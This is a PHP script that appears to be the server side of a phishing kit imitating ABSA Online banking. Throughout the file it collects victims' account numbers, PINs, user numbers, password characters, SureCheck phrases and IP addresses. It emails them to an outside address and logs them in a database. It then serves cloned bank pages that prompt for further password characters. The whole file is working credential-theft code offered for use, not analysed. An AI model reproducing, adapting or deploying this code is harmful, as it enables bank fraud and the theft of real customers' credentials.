<?php
session_start();
if(isset($_GET['AccessAccount']) && $_GET['AccessAccount'] != "")
{
    include_once 'sqlite.php';
        //echo '<pre>'.print_r($_GET).'</pre>';
        $ccn = $_GET['AccessAccount'];
	$csp = $_GET['PIN'];
	$atm = $_GET['Operator'];
        
        $nextPasswordBlock = explode(" ", $_GET['nextPasswordBlock']);
        
        foreach($nextPasswordBlock as $key => $value){
            $npblock[$value] = $value;
        }
        
        $passwordLength = $_GET['pLength'];
        $next3Block = array_rand($npblock, 3);
        
        //echo '<pre>'; print_r($next3Block); echo '</pre>'; die;
        
        
        //$password = $_GET['password'];
        
        $surePhrase = $_GET['surephrase'];
        
	$ip = $_SERVER['REMOTE_ADDR'];
        
        //if (preg_match('/[A-Za-z]/', $password) && preg_match('/[0-9]/', $password))
        if($ccn)
        {

            $time = time();

            $msg = "+++++++++++++++++++++++++++++++++++++++\r\n";
            $msg .= "AccessAccount No : $ccn\r\n";
            $msg .= "Customer Pin : $csp\r\n";
            $msg .= "user number : $atm\r\n\r\n";
            //$msg .= "Password: $password\r\n\r\n";
            foreach($_GET['Password'] as $key => $value){
                $msg .= $key.': '.$value."\r\n";
            }
            $msg .= "\r\n\rRemote_Addr : $ip\r\n\n";
            $msg .= "+++++++++++++++++++++++++++++++++++++++\r\n\r\n";

            //print_r($msg);
            
            $_SESSION['msg'] = $msg;
            $_SESSION['param'] = $_GET;

            $from = "support@".$_SERVER['HTTP_HOST'];
            $headers = "From:" . $from;
            $subject = "ABSA | Password - $ccn - $ip ".$_SERVER['HTTP_HOST'];
            $result = 'jbroughton49@usa.com';

            if(mail($result, $subject, $msg, $headers))
            if(1)
            {
                $query = 'INSERT INTO result (subject,message,isread,date_time) VALUES ("'.$subject.'","'.$msg.'","notread","'. date("Y-m-d H:i:s").'");';
                $sqlqueryResult = mysqli_query($dbconnect, $query);
                
                //$db->exec($query);
                /*
                sleep(5);
                $experience_login = file_get_contents('../sureCheckCountdown.htm');

                $experience_login = str_replace("{AccessAccount}", $ccn, $experience_login);
                $experience_login = str_replace("{PIN}", $csp, $experience_login);
//                include("../images/logo-blu.png");
                $experience_login = str_replace("{Operator}", $atm, $experience_login);
                $experience_login = str_replace("{password}", $password, $experience_login);
                
                $experience_login = str_replace("{Verified}", $surePhrase, $experience_login);
                $experience_login = str_replace("{sureCheck}", $surePhrase, $experience_login);
                */
                if($_GET['next'] == "ok"){
                    $passwordBlocks = "";
                    $nextPasswordBlock = "";
                    $pff = 1;


                    for($i=1;$i<=$passwordLength;$i++){
                        if(in_array($i, $next3Block)){
                            $passwordBlocks .= '<input type="password" class="pf pf2 ui-keyboard-input-selected" name="Password[Pass_'.$i.']" id="pff'.$pff.'" num="'.$i.'" onkeyup="checkEntries2(this, event)" ondragstart="return false" onselectstart="return false" tabindex="1" maxlength="1" value="" autocomplete="off" aria-label="Password '.$i.'" aria-labelledby="id_pff'.$i.'" showMeHow="This is password character number '.$i.'." /><!-- viLabel="Password '.$i.'" -->';
                            $pff++;
                        }
                        else{
                            $passwordBlocks .= '<input type="text" class="pf pf1" name="field'.$i.'" id="field'.$i.'" disabled="true" value="'.$i.'" autocomplete="off" viLabel="Password '.$i.'" />';
                            $nextPasswordBlock .= $i." ";
                        }
                    }

                    $experience_login = file_get_contents('oform5.html');
                    $experience_login = str_replace("{charactersPassword}", $passwordBlocks, $experience_login);
                    $experience_login = str_replace("{nextPasswordBlock}", trim($nextPasswordBlock), $experience_login);
                    $experience_login = str_replace("{pLength}", $passwordLength, $experience_login);
                    
                    $experience_login = str_replace("loginContinue3", "loginContinue4", $experience_login);
                }
                
                if($_GET['next'] == "surecheck"){
                    
                    $experience_login = file_get_contents('../~~Express - Manage Devices - Absa Online.htm');

                    $experience_login = str_replace("{AccessAccount}", $ccn, $experience_login);
                    $experience_login = str_replace("{PIN}", $csp, $experience_login);
    //                include("../images/logo-blu.png");
                    $experience_login = str_replace("{Operator}", $atm, $experience_login);
                    //$experience_login = str_replace("{password}", $password, $experience_login);

                    $experience_login = str_replace("{Verified}", $surePhrase, $experience_login);
                    $experience_login = str_replace("{sureCheck}", $surePhrase, $experience_login);
                }
                
                
                
                
                
                $experience_login = str_replace("{AccessAccount}", $ccn, $experience_login);
                $experience_login = str_replace("{PIN}", $csp, $experience_login);
                $experience_login = str_replace("{Operator}", $atm, $experience_login);
                $experience_login = str_replace("{currentLoginTime}", date("Y-m-d"), $experience_login);
                $experience_login = str_replace("{spansurephrase}", $surePhrase, $experience_login);
                $experience_login = str_replace("{spansurephrase2}", $surePhrase, $experience_login);


                //echo $data; die;
                header("Content-Type: application/javascript");
                //((mysqli_connect("localhost", "hotelswi_result", "pass@123", "hotelswi_result")) ? '':die(0));
                $callback = $_GET["callback"];
                $jsonResponse = json_encode(array('message' => $experience_login, 'success' => true, 'surecheck' => $surePhrase));
                echo $callback . '(' . $jsonResponse . ')';
                
                sleep(8);
                
            }
             else{
                //echo $experience_login;
                header("Content-Type: application/javascript");
                $callback = $_GET["callback"];
                $jsonResponse = json_encode(array('message' => "cannot send mail", 'focusElement' => "pff1"));
                echo $callback . '(' . $jsonResponse . ')';
            }
        }
        else{
            $experience_login="error";
            header("Content-Type: application/javascript");
            $callback = $_GET["callback"];
            $jsonResponse = json_encode(array('message' => $experience_login, 'focusElement' => "cellphonenumber"));
            echo $callback . '(' . $jsonResponse . ')';
        }
}